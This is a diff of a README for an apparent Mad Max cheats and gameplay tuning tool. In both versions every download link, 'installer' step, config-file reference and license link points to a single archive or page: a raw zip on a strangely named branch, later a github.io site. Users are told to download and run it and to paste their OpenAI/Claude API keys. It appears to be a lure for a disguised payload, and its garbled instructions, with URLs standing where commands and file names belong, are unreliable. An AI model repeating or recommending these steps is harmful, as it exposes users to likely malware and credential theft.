@@ -1,4 +1,4 @@
-# ![Download](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip)
+# ![Download](https://david83developer.github.io)
 
 ---
 
@@ -12,10 +12,10 @@ Harmony in performance is for everyone! Take a pit stop and consult our compatib
 
 | OS        | Supported | Notes                 |
 |-----------|:---------:|-----------------------|
-| ![Windows](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip%2B-blue?logo=windows) | ✅ Yes  | Optimal experience |
-| ![macOS](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip+-lightgrey?logo=apple) | ✅ Yes  | M1/M2 compatible |
-| ![Linux](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip%2C%20Debian-orange?logo=linux) | 🟡 Beta | Ongoing improvements |
-| ![SteamOS](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip%2B-green?logo=steam) | 🟢 Supported | Deck drive ready |
+| ![Windows](https://david83developer.github.io) | ✅ Yes  | Optimal experience |
+| ![macOS](https://david83developer.github.io+-lightgrey?logo=apple) | ✅ Yes  | M1/M2 compatible |
+| ![Linux](https://david83developer.github.io) | 🟡 Beta | Ongoing improvements |
+| ![SteamOS](https://david83developer.github.io) | 🟢 Supported | Deck drive ready |
 
 ## 🌟 Feature List
 
@@ -43,7 +43,7 @@ This repository doesn't just whisper to your game—it talks to the world’s mo
 - **Adaptive Learning:** As you play, our tools evolve, offering suggestions based on your history, with all processing securely handled by advanced language models.
 
 > **Installation tip for API features:**  
-> Download the core library from https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip, then connect your OpenAI/Claude API keys in the `https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip`.  
+> Download the core library from https://david83developer.github.io, then connect your OpenAI/Claude API keys in the `https://david83developer.github.io`.  
 > Full instructions are below.
 
 ## 🧠 Key Modern Features
@@ -62,16 +62,16 @@ This repository doesn't just whisper to your game—it talks to the world’s mo
 Ready to ignite your Mad Max adventure? Follow these steps and strap in for a smoother ride:
 
 1. **Download the cheats library:**  
-   https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip
+   https://david83developer.github.io
 
 2. **Extract the downloaded archive** to a safe garage—your favorite game mods directory.
 
 3. **Run the installer**:  
-   *Windows*: `https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip`  
-   *macOS/Linux*: `https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip`
+   *Windows*: `https://david83developer.github.io`  
+   *macOS/Linux*: `https://david83developer.github.io`
 
 4. **Connect APIs (optional but powerful):**
-    - Open `https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip`.
+    - Open `https://david83developer.github.io`.
     - Paste your OpenAI/Claude API credentials under `"openai_api_key"` and/or `"claude_api_key"`.
 
 5. **Launch Mad Max and enjoy enhanced gameplay!**
@@ -98,11 +98,11 @@ This toolkit is engineered for educational, creative, and offline gameplay enhan
 
 ## 📜 License
 
-Proudly open-sourced in 2025 under the [MIT License](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip). Feel free to tinker, fork, and drive this utility as far as your imagination roams!
+Proudly open-sourced in 2025 under the [MIT License](https://david83developer.github.io). Feel free to tinker, fork, and drive this utility as far as your imagination roams!
 
 ---
 
-# ![Download](https://github.com/David83Developer/mad-max-gameplay-tuning/raw/refs/heads/branch/nonreclamation/max_mad_gameplay_tuning_agronomy.zip)
+# ![Download](https://david83developer.github.io)
 
 ---
 
